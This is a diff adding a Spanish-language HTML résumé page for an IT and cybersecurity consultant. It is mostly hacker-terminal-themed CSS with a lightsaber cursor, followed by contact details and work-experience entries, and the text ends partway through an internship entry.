@@ -1,0 +1,2027 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MARÍA JESÚS MARTÍNEZ LEO | CIBERSEGURIDAD & SISTEMAS</title>
+  <style>
+    /* --- LIGHTSABER CURSOR --- */
+    @media (hover: hover) and (pointer: fine) {
+      body { cursor: none !important; }
+      a, button, .contact a, .exp-company a, .edu-school a, .audio-btn, .cert-item, .skill-cat, .exp-item, .edu-item { cursor: none !important; }
+      
+      /* Contenedor principal del sable */
+      .lightsaber-cursor {
+        position: fixed;
+        top: 0;
+        left: 0;
+        pointer-events: none;
+        z-index: 99999;
+        transition: all 0.12s ease-out;
+      }
+      
+      /* === SABRE VERDE (NORMAL) === */
+      .lightsaber-cursor.green {
+        width: 6px;
+        height: 55px;
+        transform: translate(-40%, -8%) rotate(-45deg);
+        transform-origin: 70% 90%;
+        filter: drop-shadow(0 0 8px rgba(0,255,65,0.8)) drop-shadow(0 0 16px rgba(0,255,65,0.6)) drop-shadow(0 0 24px rgba(0,255,65,0.4));
+      }
+      
+      .lightsaber-cursor.green .lightsaber-blade {
+        width: 100%;
+        height: 78%;
+        background: linear-gradient(
+          to bottom,
+          #ffffff 0%,
+          #ddffdd 8%,
+          #00ff41 18%,
+          #00ff41 72%,
+          #008f11 100%
+        );
+        border-radius: 3px 3px 1px 1px;
+        position: relative;
+        box-shadow: 
+          0 0 15px rgba(0,255,65,0.9),
+          0 0 28px rgba(0,255,65,0.7),
+          0 0 42px rgba(0,255,65,0.5),
+          inset 0 0 12px rgba(255,255,255,0.5),
+          inset 0 0 20px rgba(255,255,255,0.3);
+      }
+      
+      .lightsaber-cursor.green .lightsaber-blade::before {
+        content: "";
+        position: absolute;
+        top: -7px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 10px;
+        height: 10px;
+        background: radial-gradient(circle, #ffffff 0%, #00ff41 35%, transparent 100%);
+        border-radius: 50%;
+        box-shadow: 
+          0 0 20px rgba(0,255,65,0.9),
+          0 0 40px rgba(0,255,65,0.8),
+          0 0 60px rgba(0,255,65,0.6);
+        animation: bladeTipPulse 0.7s ease-in-out infinite;
+      }
+      
+      .lightsaber-cursor.green .lightsaber-blade::after {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+          90deg,
+          transparent 0%,
+          rgba(255,255,255,0.6) 25%,
+          rgba(255,255,255,0.6) 75%,
+          transparent 100%
+        );
+        border-radius: 3px 3px 1px 1px;
+        animation: bladeEnergyFlow 1.8s ease-in-out infinite;
+      }
+      
+      .lightsaber-cursor.green .lightsaber-handle {
+        position: absolute;
+        bottom: -22px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 8px;
+        height: 26px;
+        background: linear-gradient(180deg, 
+          #999 0%, 
+          #666 25%, 
+          #444 50%, 
+          #222 75%, 
+          #111 100%);
+        border: 1px solid #008f11;
+        border-radius: 2px;
+        box-shadow: 
+          0 0 12px rgba(0,0,0,0.9),
+          inset 0 0 6px rgba(255,255,255,0.2);
+      }
+      
+      .lightsaber-cursor.green .lightsaber-handle::before {
+        content: "";
+        position: absolute;
+        top: 4px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 12px;
+        height: 3px;
+        background: linear-gradient(90deg, #444, #777, #444);
+        border-radius: 1px;
+        border: 1px solid #222;
+        box-shadow: 0 0 4px rgba(0,0,0,0.6);
+      }
+      
+      .lightsaber-cursor.green .lightsaber-handle::after {
+        content: "";
+        position: absolute;
+        bottom: 4px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 12px;
+        height: 3px;
+        background: linear-gradient(90deg, #444, #777, #444);
+        border-radius: 1px;
+        border: 1px solid #222;
+        box-shadow: 0 0 4px rgba(0,0,0,0.6);
+      }
+      
+      .lightsaber-cursor.green .lightsaber-glow {
+        position: absolute;
+        top: 32%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 22px;
+        height: 22px;
+        background: radial-gradient(circle, rgba(0,255,65,0.7) 0%, rgba(0,255,65,0.4) 45%, transparent 75%);
+        border-radius: 50%;
+        animation: lightsaberPulse 1.2s ease-in-out infinite;
+        filter: blur(3px);
+      }
+      
+      .lightsaber-cursor.green .lightsaber-trail {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(to bottom, rgba(0,255,65,0.5) 0%, transparent 100%);
+        filter: blur(5px);
+        opacity: 0.75;
+        animation: trailFlicker 0.25s ease-in-out infinite;
+      }
+      
+      /* === SABRE AZUL (LINKS) === */
+      .lightsaber-cursor.blue {
+        width: 6px;
+        height: 55px;
+        transform: translate(-40%, -8%) rotate(-45deg);
+        transform-origin: 70% 90%;
+        filter: drop-shadow(0 0 10px rgba(0,150,255,0.9)) drop-shadow(0 0 20px rgba(0,150,255,0.7)) drop-shadow(0 0 30px rgba(0,150,255,0.5));
+      }
+      
+      .lightsaber-cursor.blue .lightsaber-blade {
+        width: 100%;
+        height: 78%;
+        background: linear-gradient(
+          to bottom,
+          #ffffff 0%,
+          #ddeeff 8%,
+          #0096ff 18%,
+          #0096ff 72%,
+          #004d99 100%
+        );
+        border-radius: 3px 3px 1px 1px;
+        position: relative;
+        box-shadow: 
+          0 0 18px rgba(0,150,255,0.9),
+          0 0 32px rgba(0,150,255,0.7),
+          0 0 48px rgba(0,150,255,0.5),
+          inset 0 0 12px rgba(255,255,255,0.5),
+          inset 0 0 20px rgba(255,255,255,0.3);
+      }
+      
+      .lightsaber-cursor.blue .lightsaber-blade::before {
+        content: "";
+        position: absolute;
+        top: -7px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 10px;
+        height: 10px;
+        background: radial-gradient(circle, #ffffff 0%, #0096ff 35%, transparent 100%);
+        border-radius: 50%;
+        box-shadow: 
+          0 0 24px rgba(0,150,255,0.9),
+          0 0 48px rgba(0,150,255,0.8),
+          0 0 72px rgba(0,150,255,0.6);
+        animation: bladeTipPulse 0.6s ease-in-out infinite;
+      }
+      
+      .lightsaber-cursor.blue .lightsaber-blade::after {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+          90deg,
+          transparent 0%,
+          rgba(255,255,255,0.6) 25%,
+          rgba(255,255,255,0.6) 75%,
+          transparent 100%
+        );
+        border-radius: 3px 3px 1px 1px;
+        animation: bladeEnergyFlow 1.5s ease-in-out infinite;
+      }
+      
+      .lightsaber-cursor.blue .lightsaber-handle {
+        position: absolute;
+        bottom: -22px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 8px;
+        height: 26px;
+        background: linear-gradient(180deg, 
+          #111 0%, 
+          #222 25%, 
+          #444 50%, 
+          #666 75%, 
+          #888 100%);
+        border: 1px solid #004d99;
+        border-radius: 2px;
+        box-shadow: 
+          0 0 12px rgba(0,0,0,0.9),
+          inset 0 0 6px rgba(255,255,255,0.2);
+      }
+      
+      .lightsaber-cursor.blue .lightsaber-handle::before {
+        content: "";
+        position: absolute;
+        top: 4px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 12px;
+        height: 3px;
+        background: linear-gradient(90deg, #444, #777, #444);
+        border-radius: 1px;
+        border: 1px solid #222;
+        box-shadow: 0 0 4px rgba(0,0,0,0.6);
+      }
+      
+      .lightsaber-cursor.blue .lightsaber-handle::after {
+        content: "";
+        position: absolute;
+        bottom: 4px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 12px;
+        height: 3px;
+        background: linear-gradient(90deg, #444, #777, #444);
+        border-radius: 1px;
+        border: 1px solid #222;
+        box-shadow: 0 0 4px rgba(0,0,0,0.6);
+      }
+      
+      .lightsaber-cursor.blue .lightsaber-glow {
+        position: absolute;
+        top: 32%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 24px;
+        height: 24px;
+        background: radial-gradient(circle, rgba(0,150,255,0.8) 0%, rgba(0,150,255,0.5) 45%, transparent 75%);
+        border-radius: 50%;
+        animation: lightsaberPulse 1s ease-in-out infinite;
+        filter: blur(3px);
+      }
+      
+      .lightsaber-cursor.blue .lightsaber-trail {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(to bottom, rgba(0,150,255,0.6) 0%, transparent 100%);
+        filter: blur(5px);
+        opacity: 0.8;
+        animation: trailFlicker 0.2s ease-in-out infinite;
+      }
+      
+      /* Animaciones */
+      @keyframes bladeTipPulse {
+        0%, 100% { 
+          opacity: 1; 
+          transform: translateX(-50%) scale(1);
+        }
+        50% { 
+          opacity: 0.88; 
+          transform: translateX(-50%) scale(1.12);
+        }
+      }
+      
+      @keyframes bladeEnergyFlow {
+        0%, 100% { opacity: 0.5; }
+        50% { opacity: 0.75; }
+      }
+      
+      @keyframes lightsaberPulse {
+        0%, 100% { opacity: 0.65; transform: translate(-50%, -50%) scale(1); }
+        50% { opacity: 1; transform: translate(-50%, -50%) scale(1.18); }
+      }
+      
+      @keyframes trailFlicker {
+        0%, 100% { opacity: 0.65; }
+        50% { opacity: 0.9; }
+      }
+    }
+    
+    @media print {
+      .lightsaber-cursor { display: none !important; }
+    }
+
+    .audio-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      background: linear-gradient(180deg, var(--surface-alt) 0%, var(--surface) 100%);
+      border: 1px solid var(--primary);
+      color: var(--primary);
+      padding: 0.3rem 0.7rem;
+      font-size: 0.75rem;
+      cursor: none !important;
+      transition: all 0.25s ease;
+      text-shadow: 0 0 5px var(--primary-glow);
+      margin-top: 0.5rem;
+    }
+    .audio-btn:hover {
+      background: linear-gradient(180deg, rgba(0,40,0,0.6) 0%, rgba(0,20,0,0.3) 100%);
+      box-shadow: 0 0 15px rgba(0,255,65,0.3);
+      color: var(--text);
+      animation: pulse 1.5s infinite;
+    }
+    .audio-hidden {
+      position: fixed;
+      top: -9999px;
+      left: -9999px;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+    }
+    @media print {
+      .audio-btn, .audio-hidden { display: none !important; }
+    }
+
+    :root {
+      --bg: #000000;
+      --bg-alt: #050505;
+      --surface: #0a0a0a;
+      --surface-alt: #0f0f0f;
+      --border: #1a1a1a;
+      --border-light: #2a2a2a;
+      --primary: #00ff41;
+      --primary-dim: #00cc33;
+      --primary-dark: #008f11;
+      --primary-glow: rgba(0, 255, 65, 0.5);
+      --text: #ffffff;
+      --text-muted: #a0a0a0;
+      --text-dim: #5a5a5a;
+    }
+    
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    
+    body {
+      font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.5;
+      padding: 2rem;
+      max-width: 1000px;
+      margin: 0 auto;
+      font-size: 11px;
+      position: relative;
+    }
+    
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: 
+        radial-gradient(ellipse at 50% 0%, rgba(0,40,0,0.4) 0%, transparent 60%),
+        repeating-linear-gradient(0deg, rgba(0,20,0,0.03) 0px, rgba(0,20,0,0.03) 1px, transparent 1px, transparent 3px);
+      pointer-events: none;
+      z-index: -1;
+    }
+    
+    body::after {
+      content: "";
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: repeating-linear-gradient(
+        0deg,
+        rgba(0, 0, 0, 0.3) 0px,
+        rgba(0, 0, 0, 0.3) 1px,
+        transparent 1px,
+        transparent 2px
+      );
+      pointer-events: none;
+      z-index: 9998;
+      opacity: 0.7;
+    }
+    
+    @keyframes cursor {
+      0%, 50% { border-right-color: var(--primary); }
+      51%, 100% { border-right-color: transparent; }
+    }
+    
+    @keyframes glitch {
+      0% { transform: translate(0); }
+      20% { transform: translate(-2px, 2px); }
+      40% { transform: translate(-2px, -2px); }
+      60% { transform: translate(2px, 2px); }
+      80% { transform: translate(2px, -2px); }
+      100% { transform: translate(0); }
+    }
+    
+    @keyframes textGlow {
+      0%, 100% { text-shadow: 0 0 8px var(--primary-glow), 0 0 15px var(--primary-glow); }
+      50% { text-shadow: 0 0 15px var(--primary-glow), 0 0 30px var(--primary-glow), 0 0 45px var(--primary-glow); }
+    }
+    
+    @keyframes blink {
+      0%, 49% { opacity: 1; }
+      50%, 100% { opacity: 0.3; }
+    }
+    
+    @keyframes pulse {
+      0%, 100% { opacity: 1; box-shadow: 0 0 5px var(--primary-glow); }
+      50% { opacity: 0.6; box-shadow: 0 0 15px var(--primary-glow); }
+    }
+    
+    @keyframes borderFlow {
+      0% { border-color: var(--primary-dark); }
+      50% { border-color: var(--primary); }
+      100% { border-color: var(--primary-dark); }
+    }
+    
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateX(-10px); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+    
+    header {
+      border: 1px solid var(--primary);
+      border-bottom: 3px solid var(--primary);
+      padding: 1.2rem 1.5rem;
+      margin-bottom: 2rem;
+      position: relative;
+      background: linear-gradient(180deg, rgba(0,40,0,0.2) 0%, rgba(0,20,0,0.05) 100%);
+      box-shadow: 0 0 30px rgba(0,255,65,0.15), inset 0 0 30px rgba(0,255,65,0.05);
+      animation: borderFlow 4s ease-in-out infinite;
+    }
+    
+    header::before {
+      content: "root@zyanetralys:~/cv# ";
+      position: absolute;
+      top: -9px;
+      left: 15px;
+      font-size: 0.75rem;
+      color: var(--primary);
+      background: var(--bg);
+      padding: 0 6px;
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    header::after {
+      content: "● [ONLINE]";
+      position: absolute;
+      right: 15px;
+      top: -9px;
+      font-size: 0.75rem;
+      color: var(--primary);
+      animation: blink 1.2s infinite;
+      background: var(--bg);
+      padding: 0 6px;
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    h1 {
+      color: var(--text);
+      font-size: 1.5rem;
+      text-transform: uppercase;
+      letter-spacing: 4px;
+      margin-bottom: 0.7rem;
+      text-shadow: 0 0 10px var(--primary-glow), 0 0 20px var(--primary-glow);
+      animation: textGlow 3s ease-in-out infinite;
+      position: relative;
+      display: inline-block;
+    }
+    
+    h1::after {
+      content: "█";
+      animation: cursor 0.9s step-end infinite;
+      color: var(--primary);
+      margin-left: 4px;
+      text-shadow: 0 0 10px var(--primary-glow);
+    }
+    
+    .contact {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.9rem 1.4rem;
+      font-size: 0.82rem;
+      color: var(--text-muted);
+      border-top: 1px dashed var(--primary-dark);
+      padding-top: 0.9rem;
+      margin-top: 0.5rem;
+    }
+    
+    .contact a {
+      color: var(--primary-dim);
+      text-decoration: none;
+      border-bottom: 1px dotted var(--primary);
+      transition: all 0.25s ease;
+      position: relative;
+    }
+    
+    .contact a::before {
+      content: "[";
+      color: var(--primary);
+      margin-right: 2px;
+      opacity: 0.7;
+    }
+    
+    .contact a::after {
+      content: "]";
+      color: var(--primary);
+      margin-left: 2px;
+      opacity: 0.7;
+    }
+    
+    .contact a:hover {
+      color: var(--primary);
+      border-bottom-color: var(--primary);
+      text-shadow: 0 0 10px var(--primary-glow);
+      padding-left: 3px;
+    }
+    
+    section {
+      margin-bottom: 2rem;
+      position: relative;
+      animation: slideIn 0.5s ease-out;
+    }
+    
+    section::before {
+      content: "";
+      position: absolute;
+      left: -1.8rem;
+      top: 0.5rem;
+      width: 3px;
+      height: calc(100% + 1.5rem);
+      background: linear-gradient(180deg, var(--primary) 0%, var(--primary-dark) 50%, transparent 100%);
+      opacity: 0.4;
+      box-shadow: 0 0 10px var(--primary-glow);
+    }
+    
+    h2 {
+      color: var(--text);
+      font-size: 0.95rem;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      border-left: 4px solid var(--primary);
+      padding-left: 1rem;
+      margin-bottom: 1.2rem;
+      background: linear-gradient(90deg, rgba(0,40,0,0.5) 0%, rgba(0,20,0,0.1) 60%, transparent 100%);
+      padding: 0.5rem 1rem;
+      position: relative;
+      display: inline-block;
+      box-shadow: 0 0 15px rgba(0,255,65,0.2);
+    }
+    
+    h2::before {
+      content: "$ ";
+      color: var(--primary);
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    h2:hover {
+      animation: glitch 0.3s ease;
+      color: var(--primary);
+    }
+    
+    .exp-item {
+      margin-bottom: 1.4rem;
+      padding-left: 1.3rem;
+      border-left: 1px dotted var(--border-light);
+      position: relative;
+      transition: all 0.3s ease;
+      background: linear-gradient(90deg, rgba(0,30,0,0.1) 0%, transparent 100%);
+    }
+    
+    .exp-item:hover {
+      border-left-color: var(--primary);
+      border-left-style: solid;
+      background: linear-gradient(90deg, rgba(0,40,0,0.25) 0%, transparent 100%);
+      padding-left: 1.5rem;
+    }
+    
+    .exp-item::before {
+      content: ">";
+      position: absolute;
+      left: -5px;
+      top: 3px;
+      color: var(--primary);
+      font-size: 0.7rem;
+      animation: pulse 2s infinite;
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    .exp-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      margin-bottom: 0.4rem;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+    }
+    
+    .exp-title {
+      color: var(--text);
+      font-weight: 700;
+      font-size: 0.92rem;
+      text-shadow: 0 0 5px rgba(255,255,255,0.3);
+    }
+    
+    .exp-company {
+      color: var(--primary-dim);
+      font-size: 0.84rem;
+    }
+    
+    .exp-company a {
+      color: var(--primary-dim);
+      text-decoration: none;
+      border-bottom: 1px dotted var(--primary);
+      transition: all 0.25s ease;
+    }
+    
+    .exp-company a:hover {
+      color: var(--primary);
+      border-bottom-color: var(--primary);
+      text-shadow: 0 0 10px var(--primary-glow);
+    }
+    
+    .exp-date {
+      color: var(--text-dim);
+      font-size: 0.8rem;
+      font-style: italic;
+    }
+    
+    .exp-date::before { content: "[ "; color: var(--primary-dark); }
+    .exp-date::after { content: " ]"; color: var(--primary-dark); }
+    
+    .exp-details {
+      list-style: none;
+      margin-top: 0.5rem;
+    }
+    
+    .exp-details li {
+      padding-left: 1.2rem;
+      margin-bottom: 0.25rem;
+      color: var(--text-muted);
+      font-size: 0.85rem;
+      position: relative;
+      transition: all 0.2s ease;
+    }
+    
+    .exp-details li::before {
+      content: "▸";
+      position: absolute;
+      left: 0;
+      color: var(--primary);
+      font-weight: bold;
+      text-shadow: 0 0 5px var(--primary-glow);
+    }
+    
+    .exp-details li:hover {
+      color: var(--text);
+      padding-left: 1.4rem;
+    }
+    
+    .skills-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 0.8rem;
+    }
+    
+    .skill-cat {
+      background: linear-gradient(180deg, var(--surface) 0%, var(--surface-alt) 100%);
+      border: 1px solid var(--border);
+      border-left: 3px solid var(--primary);
+      padding: 0.85rem;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .skill-cat::before {
+      content: "";
+      position: absolute;
+      top: 0; left: -100%;
+      width: 100%; height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(0,255,65,0.08), transparent);
+      transition: left 0.5s ease;
+    }
+    
+    .skill-cat:hover::before {
+      left: 100%;
+    }
+    
+    .skill-cat:hover {
+      border-color: var(--primary);
+      border-left-color: var(--primary);
+      box-shadow: 0 0 20px rgba(0,255,65,0.25), inset 0 0 20px rgba(0,255,65,0.05);
+      transform: translateX(4px);
+    }
+    
+    .skill-cat h3 {
+      color: var(--primary);
+      font-size: 0.85rem;
+      margin-bottom: 0.5rem;
+      border-bottom: 1px dashed var(--border-light);
+      padding-bottom: 0.4rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    .skill-list {
+      list-style: none;
+      font-size: 0.8rem;
+      color: var(--text-muted);
+    }
+    
+    .skill-list li {
+      margin-bottom: 0.2rem;
+      padding-left: 1rem;
+      position: relative;
+      transition: all 0.2s ease;
+    }
+    
+    .skill-list li::before {
+      content: ">";
+      position: absolute;
+      left: 0;
+      color: var(--primary);
+      text-shadow: 0 0 5px var(--primary-glow);
+    }
+    
+    .skill-list li:hover {
+      color: var(--primary);
+      padding-left: 1.3rem;
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    .edu-item {
+      margin-bottom: 0.65rem;
+      font-size: 0.84rem;
+      padding-left: 1rem;
+      border-left: 2px solid var(--border);
+      transition: all 0.25s ease;
+      background: linear-gradient(90deg, rgba(0,20,0,0.08) 0%, transparent 100%);
+    }
+    
+    .edu-item:hover {
+      border-left-color: var(--primary);
+      background: linear-gradient(90deg, rgba(0,40,0,0.2) 0%, transparent 100%);
+      padding-left: 1.2rem;
+    }
+    
+    .edu-title {
+      color: var(--text);
+      font-weight: 600;
+    }
+    
+    .edu-school {
+      color: var(--primary-dim);
+      font-size: 0.82rem;
+    }
+    
+    .edu-school a {
+      color: var(--primary-dim);
+      text-decoration: none;
+      border-bottom: 1px dotted var(--primary);
+      transition: all 0.25s ease;
+    }
+    
+    .edu-school a:hover {
+      color: var(--primary);
+      border-bottom-color: var(--primary);
+      text-shadow: 0 0 10px var(--primary-glow);
+    }
+    
+    .edu-date {
+      color: var(--text-dim);
+      font-size: 0.78rem;
+    }
+    
+    .cert-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+      gap: 0.3rem;
+      font-size: 0.75rem;
+      color: var(--text-muted);
+    }
+    
+    .cert-item {
+      background: linear-gradient(180deg, var(--surface-alt) 0%, var(--surface) 100%);
+      border: 1px solid var(--border);
+      border-radius: 2px;
+      padding: 0.4rem 0.6rem;
+      transition: all 0.2s ease;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .cert-item::before {
+      content: "";
+      position: absolute;
+      top: 0; left: -100%;
+      width: 100%; height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(0,255,65,0.12), transparent);
+      transition: left 0.4s ease;
+    }
+    
+    .cert-item:hover {
+      border-color: var(--primary);
+      background: linear-gradient(180deg, rgba(0,40,0,0.5) 0%, rgba(0,20,0,0.3) 100%);
+      transform: translateX(4px);
+      box-shadow: 0 0 15px rgba(0,255,65,0.2);
+    }
+    
+    .cert-item:hover::before {
+      left: 100%;
+    }
+    
+    .cert-item strong {
+      color: var(--primary);
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    .cert-item:hover strong {
+      color: var(--text);
+    }
+    
+    .projects-list {
+      list-style: none;
+      font-size: 0.82rem;
+      color: var(--text-muted);
+    }
+    
+    .projects-list li {
+      margin-bottom: 0.35rem;
+      padding-left: 1.5rem;
+      position: relative;
+      transition: all 0.2s ease;
+    }
+    
+    .projects-list li::before {
+      content: "├─";
+      position: absolute;
+      left: 0;
+      color: var(--primary);
+      text-shadow: 0 0 5px var(--primary-glow);
+    }
+    
+    .projects-list li:last-child::before {
+      content: "└─";
+    }
+    
+    .projects-list li:hover {
+      color: var(--text);
+      padding-left: 1.7rem;
+    }
+    
+    .availability {
+      font-size: 0.82rem;
+      color: var(--text-muted);
+      background: linear-gradient(180deg, var(--surface) 0%, var(--surface-alt) 100%);
+      border: 1px solid var(--border);
+      border-left: 4px solid var(--primary);
+      padding: 0.9rem;
+      box-shadow: 0 0 20px rgba(0,255,65,0.1);
+    }
+    
+    .availability span {
+      color: var(--primary);
+      font-weight: 700;
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    .tag {
+      display: inline-block;
+      background: linear-gradient(180deg, var(--surface-alt) 0%, var(--surface) 100%);
+      border: 1px solid var(--primary);
+      color: var(--primary);
+      padding: 0.1rem 0.45rem;
+      font-size: 0.7rem;
+      margin-right: 0.3rem;
+      letter-spacing: 0.5px;
+      text-shadow: 0 0 5px var(--primary-glow);
+    }
+    
+    footer {
+      margin-top: 3rem;
+      padding-top: 1.2rem;
+      border-top: 1px solid var(--border);
+      font-size: 0.75rem;
+      color: var(--text-dim);
+      text-align: center;
+      position: relative;
+    }
+    
+    footer::before {
+      content: "════════════════════════════════════════════════";
+      display: block;
+      color: var(--primary);
+      margin-bottom: 0.6rem;
+      font-size: 0.65rem;
+      letter-spacing: 3px;
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    footer::after {
+      content: "[ Call me, beep me, if you wanna reach me ]";
+      display: block;
+      color: var(--primary);
+      margin-top: 0.4rem;
+      animation: blink 2s infinite;
+      text-shadow: 0 0 10px var(--primary-glow);
+      letter-spacing: 2px;
+    }
+    
+    .divider {
+      color: var(--primary);
+      font-size: 0.7rem;
+      text-align: center;
+      margin: 1.5rem 0;
+      letter-spacing: 4px;
+      opacity: 0.7;
+      text-shadow: 0 0 8px var(--primary-glow);
+    }
+    
+    .corner {
+      position: fixed;
+      width: 100px;
+      height: 100px;
+      border: 2px solid var(--primary);
+      opacity: 0.3;
+      pointer-events: none;
+      z-index: 9997;
+    }
+    
+    .corner-tl { top: 20px; left: 20px; border-right: none; border-bottom: none; }
+    .corner-tr { top: 20px; right: 20px; border-left: none; border-bottom: none; }
+    .corner-bl { bottom: 20px; left: 20px; border-right: none; border-top: none; }
+    .corner-br { bottom: 20px; right: 20px; border-left: none; border-top: none; }
+    
+    @media print {
+      body {
+        background: #fff;
+        color: #000;
+        padding: 1rem;
+        font-size: 10px;
+        font-family: 'Consolas', 'Courier New', monospace;
+      }
+      body::before, body::after { display: none; }
+      .corner { display: none; }
+      header::before, header::after { display: none; }
+      h1 { color: #000; text-shadow: none; animation: none; }
+      h1::after { display: none; }
+      h2 { color: #000; border-left-color: #000; background: none; box-shadow: none; }
+      h2::before { content: ""; }
+      .exp-title { color: #000; }
+      .exp-company, .exp-company a, .edu-school, .edu-school a { color: #333; }
+      .exp-details li, .skill-list li, .cert-item, .projects-list li { color: #444; }
+      .exp-details li::before, .skill-list li::before, .projects-list li::before { color: #000; }
+      .skill-cat, .cert-item, .availability { background: #f5f5f5; border-color: #ccc; box-shadow: none; }
+      .cert-item strong, .tag { color: #000; border-color: #000; text-shadow: none; }
+      a { color: #000; text-decoration: none; border: none; }
+      footer::before, footer::after { content: ""; }
+      .divider { display: none; }
+      section::before { display: none; }
+      .exp-item:hover, .edu-item:hover, .skill-cat:hover, .cert-item:hover {
+        transform: none; box-shadow: none; background: #f5f5f5; padding-left: 1rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<!-- LIGHTSABER CURSOR -->
+<div class="lightsaber-cursor green" id="lightsaber">
+  <div class="lightsaber-trail"></div>
+  <div class="lightsaber-glow"></div>
+  <div class="lightsaber-blade"></div>
+  <div class="lightsaber-handle"></div>
+</div>
+
+<div class="corner corner-tl"></div>
+<div class="corner corner-tr"></div>
+<div class="corner corner-bl"></div>
+<div class="corner corner-br"></div>
+
+<header>
+  <h1>MARÍA JESÚS MARTÍNEZ LEO</h1>
+  <div class="contact">
+    <span>Madrid / Cádiz, España</span>
+    <span>•</span>
+    <a href="https://www.linkedin.com/in/mjmal/" target="_blank">linkedin.com/in/mjmal</a>
+    <span>•</span>
+    <a href="https://github.com/Zyanetralys" target="_blank">github.com/Zyanetralys</a>
+    <span>•</span>
+    <span>Inglés: Nivel C1 (Avanzado)</span>
+    <span>•</span>
+    <span>Carnet de conducir: B y A2</span>
+  </div>
+</header>
+
+<section>
+  <h2>EXPERIENCIA TÉCNICA</h2>
+  
+  <div class="exp-item">
+    <div class="exp-header">
+      <div>
+        <div class="exp-title">Consultora Especialista IT (Software, Backend & Cybersecurity) </div>
+        <div class="exp-company"><a href="https://www.alvatross.io/" target="_blank">Alvatross</a> | Telecomunicaciones</div>
+      </div>
+      <div class="exp-date">FEB 2026–ACT</div>
+    </div>
+    <ul class="exp-details">
+      <li>Evaluación técnica de perfiles IT (desarrollo, sistemas, DevOps y ciberseguridad).</li>
+      <li>Colaboración con equipos técnicos internacionales en entornos OSS/BSS.</li>
+      <li>Análisis de requisitos técnicos y validación de competencias en tecnologías backend y sistemas.</li>
+      <li>Interacción directa con arquitecturas de software, stacks tecnológicos y entornos de producción.</li>
+      <li>Apoyo en onboarding técnico, documentación y coordinación de proyectos IT.</li>
+      <li>Participación en entrevistas técnicas estructuradas con foco en capacidades reales de desarrollo y sistemas.</li>
+    </ul>
+  </div>
+
+  <div class="exp-item">
+    <div class="exp-header">
+      <div>
+        <div class="exp-title">Consultora Especialista IT (Software & Cybersecurity)</div>
+        <div class="exp-company"><a href="https://www.atm-maggioli.es/" target="_blank">ATM Grupo Maggioli</a> | Admin. Pública</div>
+      </div>
+      <div class="exp-date">FEB 2023– FEB 2026</div>
+    </div>
+    <ul class="exp-details">
+      <li>Evaluación de perfiles IT en entornos de desarrollo, sistemas y ciberseguridad.</li>
+      <li>Análisis funcional y técnico en proyectos bajo normativas ENS e ISO 27001.</li>
+      <li>Validación de competencias técnicas mediante entrevistas estructuradas.</li>
+      <li>Colaboración con equipos de desarrollo, sistemas, datos y seguridad.</li>
+      <li>Apoyo en definición de requisitos técnicos en procesos de selección y proyectos IT.</li>
+      <li>Participación en procesos de implantación de controles de seguridad y cumplimiento normativo.</li>
+    </ul>
+  </div>
+
+  <div class="exp-item">
+    <div class="exp-header">
+      <div>
+        <div class="exp-title">Soporte Backend (Prácticas)</div>
+        <div class="exp-company"><a href="https://www.atm-maggioli.es/" target="_blank">ATM Grupo Maggioli</a></div>
+      </div>
+      <div class="exp-date">ENE–JUN 2025</div>
+    </div>
+    <ul class="exp-details">
+      <li>Análisis de vulnerabilidades en aplicaciones web en entorno fintech.</li>
+      <li>Uso de herramientas como OWASP ZAP para testing de seguridad.</li>
+      <li>Aplicación de buenas prácticas de seguridad en autenticación y cifrado.</li>
+      <li>Automatización de tareas de análisis con Python y Bash.</li>
